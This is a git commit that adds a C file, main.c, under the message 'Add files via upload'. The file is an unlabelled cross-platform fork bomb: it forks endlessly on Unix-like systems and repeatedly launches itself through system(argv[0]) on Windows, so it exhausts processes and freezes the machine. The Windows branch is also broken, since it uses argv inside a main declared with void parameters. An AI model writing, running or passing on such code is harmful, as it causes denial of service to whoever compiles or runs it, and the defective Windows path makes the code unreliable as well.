3539e9555d0fd3e20be4cf33ce6b12ba04edac1c
Guilherme Almino Carvalho <36975422+GuilhermeIsNotUnix@users.noreply.github.com>
2019-05-25 18:24:49 -0300

    Add files via upload

---
+++ main.c
@@ -0,0 +1,33 @@
+#include <stdio.h>
+
+#ifdef _WIN32
+   #include <stdlib.h>
+#elif __APPLE__
+    #include <unistd.h>
+#elif __linux__
+    #include <unistd.h>
+#elif __unix__
+    #include <unistd.h>
+#endif
+
+int main(void) {
+	#ifdef __linux__
+		while(1) {
+			fork();
+        }
+    #elif __APPLE__
+        while(1) {
+            fork();
+        }
+    #elif __unix__
+        while(1) {
+            fork();
+        }
+	#elif _WIN32
+		while(1) {
+			system(argv[0]);
+        }
+	#endif
+	
+	return 0;
+}
